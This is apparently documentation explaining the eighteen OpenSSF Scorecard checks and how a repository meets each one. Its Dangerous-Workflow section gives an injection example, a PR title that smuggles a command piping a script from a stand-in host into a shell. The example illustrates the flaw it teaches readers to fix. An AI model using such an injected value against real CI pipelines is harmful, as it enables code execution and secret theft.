# The eighteen checks

Contents:

- [In-repo checks](#in-repo-checks) — Dangerous-Workflow, Token-Permissions,
  Pinned-Dependencies, Dependency-Update-Tool, SAST, Security-Policy, License,
  Binary-Artifacts, CI-Tests, Fuzzing, Signed-Releases, Packaging
- [GitHub-side checks](#github-side-checks) — Branch-Protection, CII-Best-Practices
- [Checks nothing configures](#checks-nothing-configures) — Vulnerabilities,
  Maintained, Code-Review, Contributors
- [Webhooks](#webhooks-experimental)

Each check scores 0–10 and carries a risk weight; the aggregate is a weighted
mean over the checks that returned a verdict. A check that returns `?`
(inconclusive) is excluded rather than counted as zero — which is why an
unreleased project is not punished for having no signed releases.

## In-repo checks

### Dangerous-Workflow (Critical)

Binary in practice: 10 if clean, 0 if a single workflow does either of these.

- **`pull_request_target` with a checkout of the PR head.** That trigger runs
  with a write token and the base repository's secrets, against code the PR
  author controls.
- **`${{ github.event.* }}` interpolated into a `run:` block.** GitHub expands
  the expression into the script before the shell sees it, so a PR title of
  `"; curl evil.sh | sh #` executes.

The fix for untrusted input is to route it through the environment, where it
arrives as data:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

### Token-Permissions (High)

Every workflow declares a top-level `permissions:` block, and no job gets more
than it needs. Scoring rewards a restrictive top-level default; a `write` grant
at top level, or a workflow with no block at all, costs the check.

The repo-wide default matters too, and lives in settings rather than in a file:
**Settings → Actions → General → Workflow permissions → Read repository contents
and packages permissions**. Workflows that declare their own needs are unaffected;
the default is what covers the ones somebody forgets to annotate.

Grants that are easy to narrow too far — check the job before removing them:

| Job does | Needs |
| --- | --- |
| Uploads SARIF to code scanning | `security-events: write` |
| Creates a release, pushes a tag | `contents: write` |
| Comments on a PR or issue | `pull-requests: write` / `issues: write` |
| Keyless signing, Scorecard publishing | `id-token: write` |
| Reads workflow run history | `actions: read` |

### Pinned-Dependencies (Medium)

Everything CI executes must be pinned to an artifact rather than to a name. It
scores proportionally, so partial work counts.

| Ecosystem | Pinned form |
| --- | --- |
| GitHub Actions | `owner/repo@<40-char SHA> # vX.Y.Z` |
| Container images | `FROM image:tag@sha256:…` |
| npm in CI | `npm ci` against a committed lockfile |
| pip in CI | `pip install --require-hashes -r requirements.txt` (all-or-nothing: pip rejects the install if any requirement lacks a hash) |
| Go tools | `go install module@vX.Y.Z` under a pinned toolchain |
| Shell installers piped to a shell | Vendor the script or pin the release asset by digest |

Resolve SHAs from upstream — `gh api repos/OWNER/REPO/commits/TAG --jq .sha` —
and keep the version comment so Dependabot can rewrite both together.

**The documented exception:** reusable workflows from
`slsa-framework/slsa-github-generator` must be referenced by tag. The generator
reads `github.action_ref` at run time to pick which builder binary to download,
and a SHA resolves to nothing. Scorecard flags it anyway; leave a comment on the
`uses:` line saying so, because it looks exactly like the mistake this check is
about.

### Dependency-Update-Tool (High)

Binary. A `.github/dependabot.yml` (or Renovate config) covering the ecosystems
in the repo satisfies it — including `github-actions`, which is what keeps the
SHA pins fresh. Presence is what is measured, not how many PRs were merged.

### SAST (Medium)

Looks for static analysis running on pull requests: CodeQL, Snyk, SonarCloud,
`golangci-lint` and similar. A `.github/workflows/codeql.yml` on `pull_request`
is the usual answer.

If CodeQL is enabled through advanced setup (a workflow file), leave **default
setup off** in **Settings → Code security** — both together analyse twice and
produce duplicate alerts.

### Security-Policy (Medium)

A `SECURITY.md` at the root, in `.github/`, or in `docs/`. Scoring is
proportional: it looks for a disclosure address or link and for text indicating
a response timeline, so a file consisting only of "report issues here" scores
below one that says who to contact and what happens next.

Pair it with **private vulnerability reporting** turned on in settings — that is
the intake path the file points at, and without it the link 404s.

### License (Low)

A recognisable `LICENSE` at the root, with an SPDX-identifiable body. Full points
need it detected in GitHub's own license metadata, so an edited or
custom-worded copy of a standard licence can score below a verbatim one.

### Binary-Artifacts (High)

Nothing executable is committed: no `.jar`, `.dll`, `.so`, `.exe`, no vendored
binaries. Images, fonts, and test fixtures that are not executable are fine.
Gradle wrapper JARs are the classic finding — `gradle/wrapper/gradle-wrapper.jar`
is a binary a reviewer cannot read.

```bash
git ls-files | xargs file --mime-type 2>/dev/null | grep -Ev 'text/|image/|inode/'
```

### CI-Tests (Low)

Reads the last thirty changesets on the default branch and looks for a CI run
associated with each. It scores merged pull requests with checks — direct pushes
to the default branch depress it even when the tests exist and pass.

### Fuzzing (Medium)

Looks for OSS-Fuzz membership, `go-fuzz`/native Go fuzz targets, ClusterFuzzLite,
or a recognised property-testing setup (fast-check, Hypothesis). Property tests
named to the convention the language expects are the cheapest way to move this in
a project too small for OSS-Fuzz.

### Signed-Releases (High)

Reads the **public** releases API for the last five releases and looks for a
signature or provenance asset alongside each artifact: `.sigstore.json`,
`.asc`, `.sig`, `.intoto.jsonl`.

- **Drafts are invisible**, so the check reports `?` until something is actually
  published — not zero, and not a sign that signing failed.
- **Sign in the same job that creates the release, before publishing.** Signing
  afterwards leaves a window where unsigned assets are downloadable, and a
  signature uploaded by a separate step is one a failure can silently omit.
- **Generate provenance from a reusable workflow, not a step.** The guarantee is
  that the attestation is produced somewhere the build cannot reach; a step in
  the build job could write its own.

Note that this is not code signing. Cosign proves which workflow produced the
bytes; it does not stop Gatekeeper or SmartScreen warning on an unnotarised
installer. The two answer different questions.

### Packaging (Medium)

Looks for a recognised publishing workflow — npm, PyPI, Maven, Docker, RubyGems,
`goreleaser`. It reports `?` for anything it does not recognise, such as an
installer attached to a GitHub release. Inconclusive costs nothing, so an
unrecognised distribution method is not worth restructuring for.

## GitHub-side checks

### Branch-Protection (High)

Tiered, and each tier only counts once the one below it is complete. The full
table and the solo-maintainer trade-off are in `github-settings.md`.

Scorecard needs an admin token to read the rules — a `?` here in a local run
usually means the token lacked permission, not that protection is off.

### CII-Best-Practices (Low)

Zero until the project is registered at <https://www.bestpractices.dev/> and the
questionnaire is filled in. Nothing in the repository can change it. Worth doing
after the first release, since several questions are about release process and
vulnerability response.

## Checks nothing configures

These four are measurements of the project rather than settings. They move when
the project changes, and are the ones to report honestly rather than engineer.

### Vulnerabilities (High)

Known-vulnerable dependencies, read from OSV. Turning on Dependabot alerts and
security updates is what keeps this at ten, because a disclosure opens a PR the
same day rather than waiting for the next routine bump.

### Maintained (High)

Commit and issue activity over the last ninety days. An archived repository
scores zero by definition.

### Code-Review (High)

Reads the last thirty changesets on the default branch and counts unique
reviewers **excluding the author**. A self-approved PR scores zero, and so does a
direct push. A single-maintainer repository scores zero here, and the zero is
accurate. What moves it is a second human, or a review bot with its own identity.

### Contributors (Low)

Wants contributors from at least two organisations across recent commits, read
from the company field on contributor profiles. It measures project size, not
security.

## Webhooks (experimental)

Checks that repository webhooks use a secret token. Not part of the published
aggregate; it only appears when explicitly requested.
